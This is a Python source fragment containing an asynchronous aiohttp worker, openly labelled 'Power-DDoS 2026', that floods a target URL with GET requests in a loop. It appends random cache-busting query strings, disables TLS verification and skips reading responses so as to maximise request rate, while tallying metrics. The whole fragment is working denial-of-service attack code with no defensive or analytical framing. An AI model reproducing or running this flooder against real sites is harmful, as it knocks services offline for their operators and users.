import asyncio
import aiohttp
import time
import logging
import random
import string

async def ultra_worker(session: aiohttp.ClientSession, url: str, metrics, stop_event: asyncio.Event, domain: str):
    """
    Optimized fire-and-forget worker. 
    Does not read response body to maximize throughput.
    """
    headers = {"Host": domain}
    strict_timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)
    
    while not stop_event.is_set():
        await metrics.record_attempt()
        start = time.monotonic()
        
        # Power-DDoS 2026: Heavy Payload & Cache Bypass
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        attack_url = f"{url}?cb={random_str}&q={random_str}" if "?" not in url else f"{url}&cb={random_str}&q={random_str}"
        
        try:
            # Fire-and-forget: get status only, release immediately
            async with session.get(
                attack_url,
                headers=headers,
                timeout=strict_timeout,
                ssl=False,
                allow_redirects=False  # No redirects = faster
            ) as resp:
                status = resp.status
                latency = (time.monotonic() - start) * 1000
                
                # Auto-released by context manager
                # Count properly based on latency
                if latency > 5000:
                    await metrics.record_timeout()
                elif status < 400:
                    await metrics.record_complete(status, latency)
                else:
                    await metrics.record_failed(f"HTTP_{status}")
                    
        except asyncio.TimeoutError:
            await metrics.record_timeout()
        except aiohttp.ClientError as e:
            await metrics.record_failed(f"ClientError:{type(e).__name__}")
        except asyncio.CancelledError:
            await metrics.record_cancelled()
            raise
        except Exception as e:
            await metrics.record_failed(f"Unexpected:{type(e).__name__}")
